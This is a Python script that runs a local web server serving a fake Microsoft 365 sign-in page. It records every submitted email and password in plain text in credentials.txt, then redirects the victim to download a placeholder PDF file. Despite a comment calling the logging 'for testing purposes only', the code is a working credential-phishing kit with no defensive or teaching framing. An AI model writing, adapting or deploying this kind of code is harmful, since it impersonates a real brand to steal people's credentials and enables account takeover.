import http.server
import socketserver
from urllib.parse import parse_qs
import os

# Define the port for the web server
PORT = 8000

# HTML page to serve (login form)
html_form = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
            font-family: georgia, sans-serif;
            letter-spacing: 1px;
           
        }
        .container {
            width: 400px;
            padding: 20px;
            background-color: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            text-align: center;
           
        }
        .container img {
            width: 150px;
            margin-bottom: 20px;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 95%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: black;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #444;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft 365">
        <h2>Sign in</h2>
        <form method="POST" action="/">
            <div class="input-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Sign In</button>
        </form>
    </div>
</body>
</html>
"""


class RequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        """Serve the HTML form."""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(html_form.encode())

    def do_POST(self):
        """Handle form submission and redirect to download."""
        # Get the length of the POST data
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        # Parse the form data
        data = parse_qs(post_data.decode())
        email = data.get('email', [''])[0]
        password = data.get('password', [''])[0]

        # Log the credentials (for testing purposes only)
        with open("credentials.txt", "a") as f:
            f.write(f"Email: {email}, Password: {password}\n")

        # Redirect to the download route
        self.send_response(302)
        self.send_header('Location', '/download')
        self.end_headers()

    def do_GET(self):
        """Serve the file if requested at /download."""
        if self.path == "/download":
            # Serve the sample PDF file
            file_path = "sample.pdf"
            if os.path.exists(file_path):
                self.send_response(200)
                self.send_header("Content-type", "application/pdf")
                self.send_header("Content-Disposition", f"attachment; filename={os.path.basename(file_path)}")
                self.end_headers()
                with open(file_path, "rb") as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"File not found!")
        else:
            # Serve the login form for other GET requests
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(html_form.encode())


# Create a sample PDF for testing
with open("sample.pdf", "wb") as f:
    f.write(b"This is a sample PDF file.")

# Set up the server
with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
    print(f"Serving at http://localhost:{PORT}")
    httpd.serve_forever()
